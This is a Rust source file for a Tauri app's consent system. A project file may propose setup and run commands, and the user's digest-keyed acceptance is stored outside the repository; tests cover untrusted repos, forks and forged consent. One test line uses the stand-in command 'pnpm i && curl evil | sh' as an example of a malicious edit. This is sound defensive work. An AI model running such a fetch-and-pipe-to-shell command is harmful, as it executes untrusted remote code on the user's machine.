// `<worktree>/.tori/project.json` only proposes. The user's acceptance of its
// exact bytes lives in Tori's config directory, never in the project, so a repo
// cannot answer for itself, and any edit asks again.

use std::path::{Path, PathBuf};
use std::sync::{Mutex, MutexGuard};

use serde::{Deserialize, Serialize};
use serde_json::Value;
use sha2::{Digest, Sha256};

pub const CHANGED: &str = "proposals://changed";

const MAX_PORTS: u64 = 10;

#[derive(Serialize, Clone, Debug, Default, PartialEq, Eq)]
#[serde(rename_all = "camelCase")]
pub struct Values {
    #[serde(skip_serializing_if = "Option::is_none")]
    pub setup_command: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub run_command: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub teardown_command: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub ports: Option<u8>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub checks: Option<Vec<String>>,
}

impl Values {
    fn is_empty(&self) -> bool {
        *self == Values::default()
    }
}

#[derive(Debug, PartialEq, Eq)]
struct Read {
    digest: String,
    content: String,
    values: Values,
}

#[derive(Serialize, Debug, PartialEq, Eq)]
#[serde(tag = "state", rename_all = "lowercase")]
pub enum Proposal {
    None,
    Untrusted,
    Fork,
    Unaccepted {
        digest: String,
        content: String,
        values: Values,
        previous: Option<String>,
    },
    Declined {
        digest: String,
        content: String,
        values: Values,
    },
    Accepted {
        digest: String,
        values: Values,
    },
}

fn command(v: Option<&Value>) -> Option<String> {
    v.and_then(Value::as_str)
        .filter(|s| !s.trim().is_empty())
        .map(str::to_string)
}

fn parse(text: &str) -> Values {
    let Ok(Value::Object(map)) = json5::from_str::<Value>(text) else {
        return Values::default();
    };
    Values {
        setup_command: command(map.get("setupCommand")),
        run_command: command(map.get("runCommand")),
        teardown_command: command(map.get("teardownCommand")),
        ports: map
            .get("ports")
            .and_then(Value::as_u64)
            .filter(|n| (1..=MAX_PORTS).contains(n))
            .map(|n| n as u8),
        checks: map.get("checks").and_then(Value::as_array).and_then(|items| {
            items
                .iter()
                .map(|i| i.as_str().map(str::to_string))
                .collect::<Option<Vec<_>>>()
        }),
    }
}

fn file_in(worktree: &Path) -> PathBuf {
    worktree.join(crate::workspace_settings::TORI_DIR).join("project.json")
}

fn read(worktree: &Path) -> Option<Read> {
    let bytes = std::fs::read(file_in(worktree)).ok()?;
    let content = String::from_utf8(bytes).ok()?;
    let values = parse(&content);
    if values.is_empty() {
        return None;
    }
    let digest = Sha256::digest(content.as_bytes())
        .iter()
        .map(|b| format!("{b:02x}"))
        .collect();
    Some(Read {
        digest,
        content,
        values,
    })
}

#[derive(Serialize, Deserialize, Default)]
struct Answers {
    #[serde(default)]
    accepted: std::collections::BTreeMap<String, String>,
    #[serde(default)]
    declined: Vec<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    last: Option<String>,
}

#[derive(Serialize, Deserialize, Default)]
struct Store {
    #[serde(flatten)]
    projects: std::collections::BTreeMap<String, Answers>,
}

static STORE: Mutex<()> = Mutex::new(());

fn lock() -> MutexGuard<'static, ()> {
    STORE.lock().unwrap_or_else(|poisoned| poisoned.into_inner())
}

fn store_path() -> PathBuf {
    crate::owned_state::config_dir().join("proposals.json")
}

fn load_or_empty(file: &Path) -> Store {
    std::fs::read_to_string(file)
        .ok()
        .and_then(|t| serde_json::from_str(&t).ok())
        .unwrap_or_default()
}

fn state_at(file: &Path, scope: &str, worktree: &Path, trusted: bool, fork: impl FnOnce() -> bool) -> Proposal {
    if !trusted {
        return Proposal::Untrusted;
    }
    if fork() {
        return Proposal::Fork;
    }
    let Some(Read {
        digest,
        content,
        values,
    }) = read(worktree)
    else {
        return Proposal::None;
    };
    let _guard = lock();
    let store = load_or_empty(file);
    let answers = store.projects.get(scope);
    if answers.is_some_and(|a| a.accepted.contains_key(&digest)) {
        Proposal::Accepted { digest, values }
    } else if answers.is_some_and(|a| a.declined.contains(&digest)) {
        Proposal::Declined {
            digest,
            content,
            values,
        }
    } else {
        let previous = answers.and_then(|a| a.last.as_ref().and_then(|d| a.accepted.get(d)).cloned());
        Proposal::Unaccepted {
            digest,
            content,
            values,
            previous,
        }
    }
}

/// The only writes to the store. The socket must never reach this module, so an
/// agent cannot accept a file it wrote; `the_socket_cannot_reach_consent` guards it.
mod consent {
    use super::*;

    pub(super) enum Answer {
        Accept,
        Decline,
    }

    // The content is read again here rather than taken from the caller, so what
    // gets stored is the file on disk with the digest the user was shown.
    pub(super) fn answer_at(
        file: &Path,
        scope: &str,
        worktree: &Path,
        digest: &str,
        answer: Answer,
    ) -> Result<(), String> {
        let read = read(worktree).ok_or("the proposal is gone")?;
        if read.digest != digest {
            return Err("the proposal changed since it was shown".to_string());
        }
        let _guard = lock();
        let mut store = load_or_empty(file);
        let answers = store.projects.entry(scope.to_string()).or_default();
        answers.declined.retain(|d| d != digest);
        answers.accepted.remove(digest);
        match answer {
            Answer::Accept => {
                answers.accepted.insert(read.digest, read.content);
                answers.last = Some(digest.to_string());
            }
            Answer::Decline => {
                answers.declined.push(read.digest);
                if answers.last.as_deref() == Some(digest) {
                    answers.last = None;
                }
            }
        }
        let text = serde_json::to_string_pretty(&store).map_err(|e| e.to_string())?;
        crate::owned_state::write_atomically(file, &text)
    }
}

fn scope_of(worktree: &Path) -> String {
    crate::trust::scope_of(worktree).to_string_lossy().into_owned()
}

pub fn proposal(worktree: &Path) -> Proposal {
    state_at(
        &store_path(),
        &scope_of(worktree),
        worktree,
        crate::trust::gate_project(worktree).is_ok(),
        || !crate::worktree::not_a_fork(worktree),
    )
}

#[tauri::command(async)]
pub fn proposal_for(worktree: String) -> Proposal {
    proposal(Path::new(&worktree))
}

fn answer(app: &tauri::AppHandle, worktree: &str, digest: &str, answer: consent::Answer) -> Result<(), String> {
    use tauri::Emitter;
    let worktree = Path::new(worktree);
    match proposal(worktree) {
        Proposal::Untrusted => return Err(crate::trust::UNTRUSTED.to_string()),
        Proposal::Fork => return Err("a fork's proposal is never used".to_string()),
        _ => {}
    }
    consent::answer_at(&store_path(), &scope_of(worktree), worktree, digest, answer)?;
    let _ = app.emit(CHANGED, ());
    Ok(())
}

#[tauri::command(async)]
pub fn accept_proposal(app: tauri::AppHandle, worktree: String, digest: String) -> Result<(), String> {
    answer(&app, &worktree, &digest, consent::Answer::Accept)
}

#[tauri::command(async)]
pub fn decline_proposal(app: tauri::AppHandle, worktree: String, digest: String) -> Result<(), String> {
    answer(&app, &worktree, &digest, consent::Answer::Decline)
}

#[cfg(test)]
mod tests {
    use super::consent::{answer_at, Answer};
    use super::*;
    use std::sync::atomic::{AtomicUsize, Ordering};

    fn temp_dir(name: &str) -> PathBuf {
        static SEQ: AtomicUsize = AtomicUsize::new(0);
        let n = SEQ.fetch_add(1, Ordering::SeqCst);
        let dir = std::env::temp_dir().join(format!("tori_proposal_{}_{name}_{n}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(dir.join("wt/.tori")).unwrap();
        dir
    }

    fn propose(dir: &Path, text: &str) {
        std::fs::write(dir.join("wt/.tori/project.json"), text).unwrap();
    }

    fn state(dir: &Path) -> Proposal {
        state_at(&dir.join("proposals.json"), "scope", &dir.join("wt"), true, || false)
    }

    fn digest_of(p: Proposal) -> String {
        match p {
            Proposal::Unaccepted { digest, .. }
            | Proposal::Declined { digest, .. }
            | Proposal::Accepted { digest, .. } => digest,
            other => panic!("no digest in {other:?}"),
        }
    }

    fn accept(dir: &Path, digest: &str) -> Result<(), String> {
        answer_at(
            &dir.join("proposals.json"),
            "scope",
            &dir.join("wt"),
            digest,
            Answer::Accept,
        )
    }

    #[test]
    fn a_valid_file_proposes_every_field() {
        let values = parse(
            r#"{ "setupCommand": "pnpm i", "runCommand": "pnpm dev", "teardownCommand": "pnpm stop",
                 "ports": 3, "checks": ["pnpm test", "pnpm lint"] }"#,
        );
        assert_eq!(
            values,
            Values {
                setup_command: Some("pnpm i".into()),
                run_command: Some("pnpm dev".into()),
                teardown_command: Some("pnpm stop".into()),
                ports: Some(3),
                checks: Some(vec!["pnpm test".into(), "pnpm lint".into()]),
            }
        );
    }

    #[test]
    fn unknown_and_mistyped_keys_are_dropped() {
        let values = parse(
            r#"{ "setupCommand": 7, "runCommand": "  ", "teardownCommand": "make clean",
                 "checks": ["ok", 1], "trusted": true, "lsp": { "enabled": ["rust"] } }"#,
        );
        assert_eq!(
            values,
            Values {
                teardown_command: Some("make clean".into()),
                ..Values::default()
            }
        );
    }

    #[test]
    fn a_port_count_outside_one_to_ten_is_dropped() {
        assert_eq!(parse(r#"{ "ports": 0 }"#).ports, None);
        assert_eq!(parse(r#"{ "ports": 11 }"#).ports, None);
        assert_eq!(parse(r#"{ "ports": 2.5 }"#).ports, None);
        assert_eq!(parse(r#"{ "ports": 10 }"#).ports, Some(10));
    }

    #[test]
    fn a_missing_or_empty_file_proposes_nothing() {
        let dir = temp_dir("missing");
        assert_eq!(state(&dir), Proposal::None);
        propose(&dir, r#"{ "unknown": 1 }"#);
        assert_eq!(state(&dir), Proposal::None);
        propose(&dir, "not json");
        assert_eq!(state(&dir), Proposal::None);
    }

    #[test]
    fn untrusted_and_fork_worktrees_never_read_the_file() {
        let dir = temp_dir("gates");
        propose(&dir, r#"{ "setupCommand": "pnpm i" }"#);
        let file = dir.join("proposals.json");
        assert_eq!(
            state_at(&file, "scope", &dir.join("wt"), false, || false),
            Proposal::Untrusted
        );
        assert_eq!(state_at(&file, "scope", &dir.join("wt"), true, || true), Proposal::Fork);
    }

    #[test]
    fn accepting_round_trips_and_an_edit_asks_again() {
        let dir = temp_dir("roundtrip");
        propose(&dir, r#"{ "setupCommand": "pnpm i" }"#);
        let first = digest_of(state(&dir));
        accept(&dir, &first).unwrap();
        assert!(
            matches!(state(&dir), Proposal::Accepted { values, .. } if values.setup_command.as_deref() == Some("pnpm i"))
        );

        propose(&dir, r#"{ "setupCommand": "pnpm i && curl evil | sh" }"#);
        match state(&dir) {
            Proposal::Unaccepted { previous, .. } => {
                assert_eq!(previous.as_deref(), Some(r#"{ "setupCommand": "pnpm i" }"#))
            }
            other => panic!("expected unaccepted, got {other:?}"),
        }

        propose(&dir, r#"{ "setupCommand": "pnpm i" }"#);
        assert!(matches!(state(&dir), Proposal::Accepted { .. }));
    }

    #[test]
    fn a_consent_claim_shipped_inside_the_project_changes_nothing() {
        let dir = temp_dir("claim");
        propose(&dir, r#"{ "setupCommand": "pnpm i" }"#);
        let digest = digest_of(state(&dir));
        let claim = serde_json::json!({ "scope": { "accepted": { digest: "x" } } });
        std::fs::write(dir.join("wt/.tori/proposals.json"), claim.to_string()).unwrap();
        assert!(matches!(state(&dir), Proposal::Unaccepted { .. }));
    }

    #[test]
    fn the_socket_cannot_reach_consent() {
        fn scan(dir: &Path, hits: &mut Vec<PathBuf>) {
            for entry in std::fs::read_dir(dir).unwrap().flatten() {
                let path = entry.path();
                if path.is_dir() {
                    scan(&path, hits);
                } else if path.extension().is_some_and(|e| e == "rs") {
                    let text = std::fs::read_to_string(&path).unwrap();
                    if ["consent", "accept_proposal", "decline_proposal"]
                        .iter()
                        .any(|name| text.contains(name))
                    {
                        hits.push(path);
                    }
                }
            }
        }
        let mut hits = Vec::new();
        scan(&Path::new(env!("CARGO_MANIFEST_DIR")).join("src/rpc"), &mut hits);
        assert!(hits.is_empty(), "the socket reaches proposal consent in {hits:?}");
    }
}
